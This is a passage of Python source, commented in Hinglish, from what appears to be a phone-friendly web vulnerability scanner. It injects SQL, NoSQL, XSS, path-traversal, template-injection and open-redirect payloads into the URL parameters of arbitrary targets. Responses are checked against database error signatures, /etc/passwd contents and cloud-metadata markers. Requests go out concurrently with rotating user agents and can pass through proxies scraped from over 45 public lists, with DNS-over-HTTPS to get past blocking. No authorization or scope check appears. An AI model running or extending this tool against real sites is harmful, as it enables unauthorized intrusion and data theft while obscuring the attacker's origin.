    "MSSQL": ["Msg 102, Level 15, State 1", "Msg 105, Level 15", "Msg 208, Level 16",
              "Microsoft.Data.SqlClient"],
    "Oracle": ["ORA-00600", "ORA-04063", "ORA-00979", "ORA-00937"],
}
for _db, _pats in _DBMS_EXTRA2.items():
    DBMS_ERRORS.setdefault(_db, [])
    for _p in _pats:
        if _p not in DBMS_ERRORS[_db]:
            DBMS_ERRORS[_db].append(_p)

for _db, _pats in _DBMS_EXTRA.items():
    DBMS_ERRORS.setdefault(_db, [])
    for _p in _pats:
        if _p not in DBMS_ERRORS[_db]:
            DBMS_ERRORS[_db].append(_p)

DBMS_COUNT = sum(len(v) for v in DBMS_ERRORS.values())


def dbms_fingerprint(text: str) -> list:
    """Response text me DBMS error patterns dhoondo (passive identify, koi attack nahi)."""
    t = str(text or "")[:200000]
    if not t:
        return []
    low = t.lower()
    hits = []
    for db, pats in DBMS_ERRORS.items():
        for pat in pats:
            if pat.lower() in low:
                hits.append((db, pat))
                break
    return hits


def inject_targets(urls: list, payload: str = "", params: list = None) -> list:
    """Har URL ke params me payload daal ke injection URLs banao."""
    pl = payload if payload is not None else "'"
    params = params or PARAM_FUZZ
    out = []
    for raw in (urls or [])[:500]:
        raw = (raw or "").strip()
        if not raw or not raw.startswith("http"):
            continue
        info = url_reverse(raw)
        pnames = info.get("params") or []
        if pnames:
            u = urlparse(raw)
            pairs = parse_qsl(u.query, keep_blank_values=True)
            for p in pnames[:6]:
                newpairs = [(k, (pl if k == p else v)) for k, v in pairs]
                out.append(urlunparse(u._replace(query=urlencode(newpairs, quote_via=quote_plus),
                                                 fragment="")))
        else:
            base = raw.split("?")[0].rstrip("/")
            for p in params[:6]:
                out.append("%s?%s=%s" % (base, p, quote_plus(pl)))
    return _uniq(out)


def payloads_for(cat: str = "all") -> list:
    if not cat or cat == "all":
        return list(PAYLOADS)
    return list(PAYLOAD_CATS.get(cat) or PAYLOADS)


# ── Probe matrix: har family ka ek chhota, asli test set ──────────────────
# Sirf MAIN payloads — har family ka ek hi solid test (fast, phone-friendly)
INJ_PROBES = [
    ("sqli", "'"),                          # error-based + quote test
    ("sqli", "1' AND '1'='2"),              # boolean false
    ("union", "-1' UNION SELECT 1,2,3-- -"),  # union
    ("nosql", "{$gt: \"\"}"),               # mongo operator
    ("xss", "\"><svg/onload=alert(1)>"),     # reflection
    ("lfi", "../../../../etc/passwd"),      # traversal
    ("ssti", "{{1337*1337}}"),              # template eval — 1787569 unique
    ("redirect", "//example.com/%2f.."),    # open redirect
]

# Sirf ASLI error phrases — "mysql"/"sqlite" jaise generic shabd nahi
SQL_GENERIC = ("you have an error in your sql syntax",
               "warning: mysql_fetch", "warning: mysqli_", "warning: mysql_",
               "unclosed quotation mark after the character string",
               "quoted string not properly terminated",
               "sqlstate[", "syntax error at or near",
               "unterminated quoted string", "unterminated string literal",
               "ora-00933", "ora-01756", "ora-00907",
               "sqlite error", "sqlite3::", "sqliteexception",
               "pg_query()", "postgresql error",
               "microsoft ole db provider", "odbc sql server driver",
               "invalid query: ", "mysql server version")

# confirm ke liye doosra payload (same family, different string)
INJ_CONFIRM = {
    "sqli": "1)' AND ('1'='2",
    "union": "-1 UNION SELECT NULL,NULL-- -",
    "nosql": '{"$ne": null}',
    "xss": '"><img src=x onerror=alert(1)>',
    "lfi": "....//....//....//etc/passwd",
    "ssti": "{{7*7}}",
    "redirect": "//example.com/%2e%2e",
    "graphql": 'query{__typename}',
}

LFI_MARKS = ("root:x:0:0:", "root:!:0:0:", "daemon:x:1:", "bin:/bin/sh",
             "[boot loader]", "for 16-bit app support", "PD9waHA")   # base64 <?php

SSRF_MARKS = ("169.254.169.254", "metadata.google.internal", "instance-identity",
              "ami-id", "secret-access-key", "127.0.0.1")

SSTI_MARKS = ("49", "7777777")


def inj_probes_for(cat: str, limit: int = 0) -> list:
    """Selected category ke hisaab se probes. all = poori matrix (19)."""
    if cat and cat in PAYLOAD_CATS and cat != "all":
        base = [pl for pl in (PAYLOAD_CATS.get(cat) or [])]
        return [(cat, pl) for pl in (base[:limit] if limit else base[:14])]
    return INJ_PROBES[:limit] if limit else list(INJ_PROBES)


def inj_build_case(raw: str, param: str, payload: str) -> str:
    """Ek param me payload daalo — baaki query intact."""
    try:
        u = urlparse(raw)
        pairs = parse_qsl(u.query, keep_blank_values=True)
        if any(k == param for k, _ in pairs):
            newp = [(k, payload if k == param else v) for k, v in pairs]
            return urlunparse(u._replace(query=urlencode(newp, quote_via=quote_plus),
                                         fragment=""))
        base = urlunparse(u._replace(query="", fragment=""))
        sep = "&" if u.query else "?"
        if u.query:
            return urlunparse(u._replace(query=u.query + "&" + param + "="
                                         + quote_plus(payload), fragment=""))
        return base + sep + param + "=" + quote_plus(payload)
    except Exception:
        return ""


def inj_verdict(family: str, payload: str, status: int, headers: dict, body: str,
                host: str = "", baseline: str = "") -> dict:
    """Response dekho — vulnerable hai ya nahi. {} = clean.

    baseline = bina payload wali same URL ki body. Jo cheez baseline me pehle se
    hai wo vulnerability NAHI hai (warna har "mysql" likhne wali site vulnerable
    dikhti thi — wahi 24% false positive ka karan tha).
    """
    b = str(body or "")[:400000]
    low = b.lower()
    base_low = str(baseline or "")[:400000].lower()
    loc = str((headers or {}).get("Location") or (headers or {}).get("location") or "")
    hits = dbms_fingerprint(b)
    if family == "nosql":
        for sig in ("MongoError", "unexpected token", "$where", "Cast to ObjectId",
                    "BSONTypeError", "E11000 duplicate key"):
            if sig.lower() in low and sig.lower() not in base_low:
                return {"type": "NoSQL", "dbms": "MongoDB", "evidence": sig}
        if hits:
            db, pat = hits[0]
            return {"type": "SQLi", "dbms": db, "evidence": pat}
        return {}
    if family == "graphql":
        for sig in ("Cannot query field", "FieldUndefined", "Expected type",
                    "__schema", "GRAPHQL_VALIDATION_FAILED", "must not have a selection"):
            if sig.lower() in low:
                return {"type": "GraphQL", "dbms": "", "evidence": sig}
        return {}
    if family in ("sqli", "blind", "union", "waf"):
        for sig in SQL_GENERIC:
            if sig in low and status in (200, 500, 502):
                db = hits[0][0] if hits else ""
                return {"type": "SQLi", "dbms": db or "unknown", "evidence": sig}
        return {}
    if family == "xss":
        needle = payload.replace("\\\"", "\"")
        if needle and needle in b and needle not in (baseline or ""):
            return {"type": "XSS", "dbms": "", "evidence": "payload reflected unescaped"}
        return {}
    if family == "lfi":
        for m in LFI_MARKS:
            if m in b and m not in base_low:
                return {"type": "LFI", "dbms": "", "evidence": "file content: %s" % m[:24]}
        if ("failed to open stream" in low and "failed to open stream" not in base_low) \
                or ("include_path" in low and "include_path" not in base_low):
            return {"type": "LFI", "dbms": "", "evidence": "include() warning"}
        return {}
    if family == "ssti":
        if "1337*1337" in payload:
            if "1787569" in b and "1337*1337" not in b:
                return {"type": "SSTI", "dbms": "", "evidence": "template evaluated 1337*1337"}
            return {}
        if "{{7*7}}" in payload or "${7*7}" in payload:
            if "49" in b and "7*7" not in b[:2000] and "49" not in base_low:
                return {"type": "SSTI", "dbms": "", "evidence": "template evaluated 7*7=49"}
        return {}
    if family == "ssrf":
        for m in SSRF_MARKS:
            if m in low:
                return {"type": "SSRF", "dbms": "", "evidence": "internal data: %s" % m}
        return {}
    if family == "redirect":
        if loc and ("example.com" in loc or "//evil" in loc):
            if host and host not in loc:
                return {"type": "OPEN REDIRECT", "dbms": "", "evidence": "Location: %s" % loc[:60]}
        return {}
    if family == "ssti":
        return {}
    return {}


INJ_STYLE = {"SQLi": "💉", "NoSQL": "🍃", "GraphQL": "🕸", "XSS": "🧪", "LFI": "📂",
             "SSTI": "🧬", "SSRF": "🌐", "OPEN REDIRECT": "↪️"}


async def inj_scan(urls: list, cat: str = "all", progress=None, uid=None,
                   timeout: float = 8.0, conc: int = 40,
                   max_targets: int = 0) -> dict:
    """ASLI scan — poore plan ko EK queue me daal ke N workers chalate hain.

    Pehle har URL ke cases alag gather hote the (per-URL barrier) — ek slow URL
    poore batch ko rok deta tha, isliye 1.8 req/s. Ab flat queue hai.
    Proxy default OFF (free proxies 90% dead → har request timeout khaati thi).
    """
    urls = _uniq([u for u in (urls or []) if str(u).startswith("http")])
    probes = inj_probes_for(cat)
    per_url = int(max_targets or sget("inj_targets", 24) or 24)
    st = {"urls": len(urls), "urls_done": 0, "tested": 0, "total": 0,
          "vulns": [], "blocked": 0, "errors": 0, "start": time.time(),
          "cat": cat, "stopped": 0, "suspected": 0, "skipped": 0,
          "dead_hosts": [], "proxy": {}, "workers": 0}

    tasks = []                      # (raw, url, family, payload, param)
    pending = {}
    for raw in urls:
        try:
            params = (url_reverse(raw).get("params") or [])[:2] or ["id"]
        except Exception:
            params = ["id"]
        cases = []
        for pn in params:
            for fam, pl in probes:
                u = inj_build_case(raw, pn, pl)
                if u:
                    cases.append((u, fam, pl, pn))
                if len(cases) >= per_url:
                    break
            if len(cases) >= per_url:
                break
        if not cases:
            continue
        pending[raw] = len(cases)
        st["total"] += len(cases)
        for (u, fam, pl, pn) in cases:
            tasks.append((raw, u, fam, pl, pn))

    if not tasks:
        st["took"] = 0.0
        return st

    _use_proxy = bool(proxy_available()) and str(
        sget("inj_proxy", 0) or 0).lower() in ("1", "true", "on", "yes")
    rot = ProxyRotator(enabled=_use_proxy)
    st["proxy"] = rot.stats()
    workers = max(4, min(64, int(conc or 40)))
    st["workers"] = workers
    q = asyncio.Queue()
    for t in tasks:
        q.put_nowait(t)
    lock = asyncio.Lock()
    seen = set()
    dead_hosts = set()
    host_fail = defaultdict(int)
    baselines = {}
    base_locks = {}
    px_stat = {"ok": 0, "fail": 0}
    conn = mk_connector(limit=max(20, workers * 2), force_close=True)
    sem = asyncio.Semaphore(workers)

    async def _fetch(session, url, px=None, read=65536):
        kw = {"headers": dict(UA, **{"User-Agent": random.choice(UA_LIST)}),
              "timeout": aiohttp.ClientTimeout(total=max(3.0, float(timeout))),
              "ssl": False, "allow_redirects": False}
        if px:
            pxc, _h2, _ip2, _s2 = await proxy_connect_url(px)
            kw["proxy"] = pxc
        async with session.get(url, **kw) as r:
            body = ""
            try:
                body = (await r.content.read(read)).decode("utf-8", "ignore")
            except Exception:
                body = ""
            return r.status, dict(r.headers), body

    async def _baseline(session, raw):
        if raw in baselines:
            return baselines[raw]
        lk = base_locks.setdefault(raw, asyncio.Lock())
        async with lk:
            if raw in baselines:
                return baselines[raw]
            body = ""
            try:
                _s, _h, body = await asyncio.wait_for(
                    _fetch(session, raw, rot.next() if rot.enabled else None),
                    timeout=max(3.0, float(timeout) + 1))
            except Exception:
                body = ""
            baselines[raw] = body
            return body

    async def _finish(raw):
        pending[raw] = pending.get(raw, 0) - 1
        if pending[raw] <= 0:
            st["urls_done"] += 1

    async def one(session, raw, u, fam, pl, pn):
        host = urlparse(raw).hostname or ""
        if host in dead_hosts:
            async with lock:
                st["skipped"] += 1
                await _finish(raw)
            return
        async with sem:
            px = rot.next() if rot.enabled else None
            try:
                status, hdrs, body = await asyncio.wait_for(
                    _fetch(session, u, px), timeout=max(4.0, float(timeout) + 2))
                if px:
                    px_stat["ok"] += 1
                    if rot.enabled:
                        rot.ok(px)
            except Exception:
                if px:
                    px_stat["fail"] += 1
                    if rot.enabled:
                        rot.dead(px)
                    # proxy hi kharab hai → 25 fail par direct pe switch
                    if px_stat["fail"] >= 25 and px_stat["ok"] < 5 and rot.enabled:
                        rot.enabled = False
                        logger.warning("inj: proxies dead (%d fail) → direct mode",
                                       px_stat["fail"])
                async with lock:
                    st["tested"] += 1
                    st["errors"] += 1
                    host_fail[host] += 1
                    if host_fail[host] >= 4 and host not in dead_hosts:
                        dead_hosts.add(host)
                        st["dead_hosts"].append(host)
                    await _finish(raw)
                return
            base_body = ""
            if fam in ("xss", "lfi", "ssti", "nosql"):
                try:
                    base_body = await _baseline(session, raw)
                except Exception:
                    base_body = ""
            verdict = inj_verdict(fam, pl, status, hdrs, body, host, base_body)
            confirmed = bool(verdict)
            if verdict:
                # 2nd request — doosre payload se confirm (false positive killer)
                pl2 = INJ_CONFIRM.get(fam)
                if pl2 and pl2 != pl:
                    try:
                        u2 = inj_build_case(raw, pn, pl2)
                        if u2:
                            s2, h2, b2 = await asyncio.wait_for(
                                _fetch(session, u2, rot.next() if rot.enabled else None),
                                timeout=max(4.0, float(timeout) + 2))
                            v2 = inj_verdict(fam, pl2, s2, h2, b2, host, base_body)
                            confirmed = bool(v2)
                    except Exception:
                        confirmed = False
            async with lock:
                st["tested"] += 1
                if status in (403, 429, 503):
                    st["blocked"] += 1
                if verdict and not confirmed:
                    st["suspected"] += 1
                if confirmed:
                    key = (raw, pn, verdict["type"])
                    if key not in seen:
                        seen.add(key)
                        st["vulns"].append({"base": raw, "url": u, "param": pn,
                                            "payload": pl, "type": verdict["type"],
                                            "dbms": verdict.get("dbms", ""),
                                            "evidence": verdict.get("evidence", ""),
                                            "status": status, "confirmed": True})
                await _finish(raw)

    async def worker(session):
        while True:
            if uid and stop_requested(uid):
                return
            try:
                raw, u, fam, pl, pn = q.get_nowait()
            except asyncio.QueueEmpty:
                return
            await one(session, raw, u, fam, pl, pn)

    async def ticker():
        while not q.empty():
            if uid and stop_requested(uid):
                return
            await asyncio.sleep(1.6)
            if progress:
                try:
                    await progress(st)
                except Exception:
                    pass
        if progress:
            try:
                await progress(st)
            except Exception:
                pass

    async with aiohttp.ClientSession(connector=conn) as session:
        _tk = asyncio.create_task(ticker())
        try:
            await asyncio.gather(*[worker(session) for _ in range(workers)])
        finally:
            _tk.cancel()
            try:
                await asyncio.gather(_tk, return_exceptions=True)
            except Exception:
                pass
    if uid and stop_requested(uid):
        st["stopped"] = 1
    st["took"] = time.time() - st["start"]
    st["by_type"] = {}
    for v in st["vulns"]:
        st["by_type"][v["type"]] = st["by_type"].get(v["type"], 0) + 1
    return st


def inject_all_payloads(urls: list, cat: str = "all") -> list:
    out = []
    for pl in payloads_for(cat):
        out += inject_targets(urls, pl)
    return _uniq(out)


# ═══════════════════════════════════════════════════════════════════════════════
#  PROXY ENGINE — 45 sources + DoH bypass + very fast checker
# ═══════════════════════════════════════════════════════════════════════════════
PROXY_SOURCES = [
    # ── jsDelivr CDN (GitHub raw ka mirror — raw.githubusercontent block ho to bhi chalta hai)
    ("text", "https://cdn.jsdelivr.net/gh/TheSpeedX/PROXY-List@master/http.txt"),
    ("text", "https://cdn.jsdelivr.net/gh/TheSpeedX/PROXY-List@master/socks4.txt"),
    ("text", "https://cdn.jsdelivr.net/gh/TheSpeedX/PROXY-List@master/socks5.txt"),
    ("text", "https://cdn.jsdelivr.net/gh/monosans/proxy-list@main/proxies/http.txt"),
    ("text", "https://cdn.jsdelivr.net/gh/monosans/proxy-list@main/proxies/socks5.txt"),
    ("text", "https://cdn.jsdelivr.net/gh/proxifly/free-proxy-list@main/proxies/protocols/http/data.txt"),
    ("text", "https://cdn.jsdelivr.net/gh/proxifly/free-proxy-list@main/proxies/protocols/socks5/data.txt"),
    ("text", "https://cdn.jsdelivr.net/gh/prxchk/proxy-list@main/http.txt"),
    ("text", "https://cdn.jsdelivr.net/gh/zloi-user/hideip.me@main/http.txt"),
    ("text", "https://cdn.jsdelivr.net/gh/vakhov/fresh-proxy-list@master/http.txt"),
    ("text", "https://cdn.jsdelivr.net/gh/vakhov/fresh-proxy-list@master/socks5.txt"),
    ("text", "https://cdn.jsdelivr.net/gh/roosterkid/openproxylist@main/HTTPS_RAW.txt"),
    ("text", "https://cdn.jsdelivr.net/gh/hookzof/socks5_list@master/proxy.txt"),
    ("text", "https://cdn.jsdelivr.net/gh/mmpx12/proxy-list@master/http.txt"),
    ("text", "https://cdn.jsdelivr.net/gh/mmpx12/proxy-list@master/socks5.txt"),
    ("text", "https://cdn.jsdelivr.net/gh/clarketm/proxy-list@master/proxy-list-raw.txt"),
    # ── Statically CDN (dusra mirror domain)
    ("text", "https://cdn.statically.io/gh/TheSpeedX/PROXY-List/master/http.txt"),
    ("text", "https://cdn.statically.io/gh/monosans/proxy-list/main/proxies/http.txt"),
    # ── gitHack (teesra mirror)
    ("text", "https://raw.githack.com/TheSpeedX/PROXY-List/master/http.txt"),
    ("text", "https://raw.githack.com/monosans/proxy-list/main/proxies/http.txt"),
    # ── GitHub via github.com domain (raw.* blocked ho to ye chal sakta hai)
    ("text", "https://github.com/TheSpeedX/PROXY-List/raw/master/http.txt"),
    ("text", "https://github.com/monosans/proxy-list/raw/main/proxies/http.txt"),
    # ── raw.githubusercontent (purane sources — jo chal rahe hain unke liye)
    ("text", "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt"),
    ("text", "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt"),
    ("text", "https://raw.githubusercontent.com/prxchk/proxy-list/main/http.txt"),
    ("text", "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt"),
    # ── API feeds (plain text)
    ("text", "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all"),
    ("text", "https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks5&timeout=10000&country=all"),
    ("text", "https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks4&timeout=10000&country=all"),
    ("text", "https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&protocol=http&proxy_format=ipport&format=text"),
    # ── ProxyScrape (proxyscrape.com/free-proxy-list) — protocol ke saath
    ("text", "https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&protocol=http&proxy_format=protocolipport&format=text&timeout=10000"),
    ("text", "https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&protocol=socks5&proxy_format=protocolipport&format=text&timeout=10000"),
    ("text", "https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&protocol=socks4&proxy_format=protocolipport&format=text&timeout=10000"),
    ("text", "https://api.proxyscrape.com/v3/free-proxy-list/get?request=displayproxies&protocol=http&proxy_format=protocolipport&format=text&timeout=10000"),
    # ── ProxyScrape GitHub mirrors (site ki hi published lists) ──
    ("text", "https://cdn.jsdelivr.net/gh/proxyscrape/free-proxy-list@main/proxies/protocols/http/data.txt"),
    ("text", "https://cdn.jsdelivr.net/gh/proxyscrape/free-proxy-list@main/proxies/protocols/socks5/data.txt"),
    ("text", "https://raw.githubusercontent.com/proxyscrape/free-proxy-list/main/proxies/protocols/http/data.txt"),
    ("text", "https://raw.githubusercontent.com/proxyscrape/free-proxy-list/main/proxies/protocols/socks4/data.txt"),
    ("text", "https://www.proxy-list.download/api/v1/get?type=http"),
    ("text", "https://www.proxy-list.download/api/v1/get?type=https"),
    ("text", "https://www.proxy-list.download/api/v1/get?type=socks5"),
    ("text", "https://openproxylist.xyz/http.txt"),
    ("text", "https://openproxylist.xyz/socks5.txt"),
    ("text", "https://proxyspace.pro/http.txt"),
    ("text", "https://proxyspace.pro/https.txt"),
    ("text", "https://proxyspace.pro/socks5.txt"),
    # ── JSON APIs
    ("json", "https://proxylist.geonode.com/api/proxy-list?limit=500&page=1&sort_by=lastChecked&sort_type=desc"),
    ("json", "https://proxylist.geonode.com/api/proxy-list?limit=500&page=2&sort_by=lastChecked&sort_type=desc"),
    ("json", "https://sunny9577.github.io/proxy-scraper/proxies.json"),
    # ── github.io mirror pages
    ("text", "https://hookzof.github.io/socks5_list/proxy.txt"),
    ("text", "https://thespeedx.github.io/PROXY-List/http.txt"),
    ("text", "https://monosans.github.io/proxy-list/proxies/http.txt"),
    ("text", "https://proxifly.github.io/free-proxy-list/proxies/protocols/http/data.txt"),
]

UA_LIST = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
]
UA = {"User-Agent": random.choice(UA_LIST),
      "Accept": "text/html,application/json,*/*",
      "Accept-Language": "en-US,en;q=0.9"}

def mk_connector(limit: int = 100, limit_per_host: int = 0, **kw):
    """Termux/Android safe connector — system DNS (ThreadedResolver), aiodns NEVER.

    Phone pe aiodns 'Could not contact DNS servers' deta hai (no /etc/resolv.conf).
    """
    kw.pop("resolver", None)
    kw["ssl"] = False
    kw.setdefault("ttl_dns_cache", 300)
    try:
        return aiohttp.TCPConnector(limit=limit, limit_per_host=limit_per_host,
                                    resolver=aiohttp.ThreadedResolver(), **kw)
    except Exception:
        kw.pop("limit_per_host", None)
        return aiohttp.TCPConnector(limit=limit, **kw)


_HOST_IP_CACHE = {}


async def resolve_host(host: str, timeout: float = 6.0) -> tuple:
    """(ip, source) — system DNS pehle, phir DoH (1.1.1.1 / 8.8.8.8). source: ip/system/doh."""
    h = str(host or "").strip().strip("[]")
    if not h:
        return "", ""
    if _valid_ip(h) or ":" in h:
        return h, "ip"
    c = _HOST_IP_CACHE.get(h)
    if c and c[2] > time.time():
        return c[0], c[1]
    ip = ""
    try:                                  # system DNS (thread pool me, non-blocking)
        loop = asyncio.get_event_loop()
        ip = await asyncio.wait_for(
            loop.run_in_executor(None, socket.gethostbyname, h), timeout=min(6.0, timeout))
    except Exception:
        ip = ""
    src = "system" if ip else ""
    if not ip:
        try:
            ip = await asyncio.wait_for(doh_resolve(h), timeout=min(8.0, timeout + 2))
            src = "doh" if ip else ""
        except Exception:
            ip, src = "", ""
    if ip:
        _HOST_IP_CACHE[h] = (ip, src, time.time() + 600)
    return ip, src


async def proxy_connect_url(url: str) -> tuple:
    """Proxy ka host domain ho to IP se connect karo (ISP DNS block bypass).

    Returns (connect_url, host, ip, source).
    """
    raw = str(url or "").strip()
    m = re.match(r"^(\w+://)?(?:([^:@/]+):([^@/]*)@)?"
                 r"(\[[0-9A-Fa-f:]+\]|[^:/@\s]+):(\d{1,5})$", raw)
    if not m:
        return raw, "", "", ""
    scheme = m.group(1) or "http://"
    user, pw = m.group(2), m.group(3)
    host, port = m.group(4), m.group(5)
    h = host.strip("[]")
    if _valid_ip(h):
        return raw, h, h, "ip"
    ip, src = await resolve_host(h)
    if not ip:
        return raw, h, "", ""
    auth = ("%s:%s@" % (user, pw)) if user else ""
    return "%s%s%s:%s" % (scheme, auth, ip, port), h, ip, src


IP_PORT = re.compile(r"(?<!\d)(\d{1,3}(?:\.\d{1,3}){3})\s*[:\s,;|]\s*(\d{2,5})(?!\d)")
PROTO_URL = re.compile(r"(?:(http|https|socks4|socks5)://)?(?:[\w.:-]+@)?(\d{1,3}(?:\.\d{1,3}){3}):(\d{2,5})")
# full format: proto://[user:pass@]host:port — IPv6 [::1]:1080 bhi
FULL_PROXY = re.compile(
    r"(?P<proto>https?|socks5h|socks5|socks4a|socks4)://"
    r"(?:(?P<cred>[^\s/@:]+:[^\s/@]*)@)?"
    r"(?P<host>\[[0-9A-Fa-f:]+\]|[^\s/:@,;|]+):(?P<port>\d{2,5})")

PROXIES = []          # [{url, proto, host, port, ms, ok, fails}]
_PROXY_CACHE = {"t": 0.0, "data": []}
PSTATS = {"sources_total": len(PROXY_SOURCES), "sources_ok": 0, "raw": 0, "hosts": []}


def _valid_ip(ip: str) -> bool:
    p = ip.split(".")
    if len(p) != 4:
        return False
    try:
        return all(0 <= int(x) <= 255 for x in p)
    except Exception:
        return False


def parse_proxies(text: str) -> list:
    """6 format: ip:port / ip port / ip,port / proto://ip:port / JSON data|proxies|results"""
    out = []
    t = text or ""
    st = t.strip()
    if st[:1] in "[{":
        try:
            j = json.loads(st)
            rows = []
            if isinstance(j, list):
                rows = j
            elif isinstance(j, dict):
                for key in ("data", "proxies", "results", "list", "proxy"):
                    if isinstance(j.get(key), list):
                        rows = j[key]
                        break
                else:
                    rows = [j]
            for r in rows:
                if not isinstance(r, dict):
                    continue
                raw_proxy = str(r.get("proxy") or "").strip()
                if raw_proxy.startswith(("http", "socks")):
                    out.append(raw_proxy)
                    continue
                ip = str(r.get("ip") or r.get("host") or r.get("ipAddress") or "").strip()
                port = r.get("port") or r.get("portNumber") or ""
                proto = str(r.get("protocols") or r.get("protocol") or r.get("type") or "http")
                if isinstance(proto, list):
                    proto = proto[0] if proto else "http"
                proto = "socks5" if "socks5" in str(proto).lower() else (
                    "socks4" if "socks4" in str(proto).lower() else (
                        "https" if "https" in str(proto).lower() else "http"))
                if ip and str(port).isdigit() and _valid_ip(ip):
                    out.append("%s://%s:%s" % (proto, ip, int(port)))
        except Exception:
            pass
    used = []   # proto URL ne jo span le liya, IP_PORT usko skip kare
    # (0a) ROTATING endpoint — host:port:user:pass  (p.webshare.io:80:user-rotate:pass)
    for m in re.finditer(
            r"(?<![\w.])([A-Za-z0-9](?:[A-Za-z0-9.\-]*[A-Za-z0-9])?\.[A-Za-z]{2,})"
            r":(\d{2,5}):([^\s:@/]+):([^\s:@/,;|]+)", t):
        host, port, user, pw = m.group(1), int(m.group(2)), m.group(3), m.group(4)
        if 1 <= port <= 65535 and user and pw:
            out.append("http://%s:%s@%s:%d" % (user, pw, host, port))
            used.append((m.start(), m.end()))
    # (0b) user:pass@host:port (bina scheme — webshare copy)
    for m in re.finditer(
            r"(?<![\w/@:.\-])([^\s:@/]+):([^\s:@/,;|]+)@"
            r"([A-Za-z0-9](?:[A-Za-z0-9.\-]*[A-Za-z0-9])?\.[A-Za-z]{2,}):(\d{2,5})", t):
        if any(m.start() < ue and m.end() > us for us, ue in used):
            continue
        user, pw, host, port = m.group(1), m.group(2), m.group(3), int(m.group(4))
        if 1 <= port <= 65535 and user and pw:
            out.append("http://%s:%s@%s:%d" % (user, pw, host, port))
            used.append((m.start(), m.end()))
    # (a) full format — proto://user:pass@host:port (IPv6 bhi)
    for m in FULL_PROXY.finditer(t):
        proto = (m.group("proto") or "http").lower()
        cred = (m.group("cred") or "").strip()
        host = m.group("host")
        port = int(m.group("port"))
        if not (1 <= port <= 65535):
            continue
        ok_host = True
        if host.startswith("["):
            ok_host = len(host) > 2
        elif not _valid_ip(host):
            ok_host = bool(re.fullmatch(r"[A-Za-z0-9.\-]+\.[A-Za-z]{2,}", host))
        if not ok_host:
            continue
        out.append("%s://%s%s:%d" % (proto, (cred + "@") if cred else "", host, port))
        used.append((m.start(), m.end()))
    # (b) proto://ip:port (bina auth) — purana format
    for m in PROTO_URL.finditer(t):
        proto = (m.group(1) or "http").lower()
        ip, port = m.group(2), int(m.group(3))
        if any(m.start() < ue and m.end() > us for us, ue in used):
            continue
        if _valid_ip(ip) and 1 <= port <= 65535:
            out.append("%s://%s:%d" % (proto, ip, port))
            used.append((m.start(), m.end()))
    for m in re.finditer(r"\[([0-9A-Fa-f:]{3,})\]\s*:\s*(\d{2,5})", t):
        if any(m.start() < ue and m.end() > us for us, ue in used):
            continue
        port = int(m.group(2))
        if 1 <= port <= 65535:
            out.append("http://[%s]:%d" % (m.group(1), port))
            used.append((m.start(), m.end()))
    for m in IP_PORT.finditer(t):
        s0, e0 = m.start(1), m.end(2)
        if any(s0 < ue and e0 > us for us, ue in used):
            continue
        ip, port = m.group(1), int(m.group(2))
        if _valid_ip(ip) and 1 <= port <= 65535:
            out.append("http://%s:%d" % (ip, port))
    return _uniq(out)


_DNS_CACHE = {}


async def doh_resolve(host: str, session=None) -> str:
    """DNS-over-HTTPS — DNS block ho to bhi IP mil jaye."""
    if host in _DNS_CACHE:
        return _DNS_CACHE[host]
    ip = ""
    providers = (("https://1.1.1.1/dns-query", {"name": host, "type": "A"}),
                 ("https://1.0.0.1/dns-query", {"name": host, "type": "A"}),
                 ("https://8.8.8.8/resolve", {"name": host, "type": "A"}),
                 ("https://9.9.9.9:5053/dns-query", {"name": host, "type": "A"}))
    for url, params in providers:
        try:
            async with aiohttp.ClientSession(connector=mk_connector(limit=2)) as s:
                async with s.get(url, params=params, headers={"Accept": "application/dns-json"},
                                 timeout=aiohttp.ClientTimeout(total=6), ssl=False) as r:
                    if r.status == 200:
                        j = await r.json(content_type=None)
                        for a in (j.get("Answer") or []):
                            cand = str(a.get("data") or "")
                            if _valid_ip(cand):
                                ip = cand
                                break
        except Exception:
            ip = ""
        if ip:
            break
    _DNS_CACHE[host] = ip
    return ip


async def fetch_source(session, kind: str, url: str, timeout: float = 12.0) -> tuple:
    """Ek source fetch → (url, proxies, raw_lines, ok). DoH fallback ke saath."""
    raw = ""
    for attempt in (1, 2):
        try:
            async with session.get(url, headers=UA, timeout=aiohttp.ClientTimeout(total=timeout),
                                   ssl=False, allow_redirects=True) as r:
                if r.status == 200:
                    raw = await r.text(errors="ignore")
                    break
        except Exception:
            raw = ""
        if attempt == 1:
            await asyncio.sleep(0.3)
    if not raw:
        try:
            u = url.split("/", 3)
            host = u[2]
            path = "/" + (u[3] if len(u) > 3 else "")
            ip = await doh_resolve(host)
            if ip:
                hdrs = dict(UA)
                hdrs["Host"] = host
                async with aiohttp.ClientSession(connector=mk_connector(limit=4)) as s2:
                    async with s2.get("https://%s%s" % (ip, path), headers=hdrs,
                                      timeout=aiohttp.ClientTimeout(total=timeout),
                                      ssl=False, allow_redirects=True) as r2:
                        if r2.status == 200:
                            raw = await r2.text(errors="ignore")
        except Exception:
            raw = ""
    if not raw:
        return url, [], 0, False
    return url, parse_proxies(raw), len(raw.splitlines()), True


async def scrape_proxies(progress=None, force: bool = False, timeout: float = 12.0) -> list:
    """Saare sources parallel me — 45 sources, ek saath."""
    now = time.time()
    if not force and (now - _PROXY_CACHE["t"] < 120) and _PROXY_CACHE["data"]:
        return list(_PROXY_CACHE["data"])
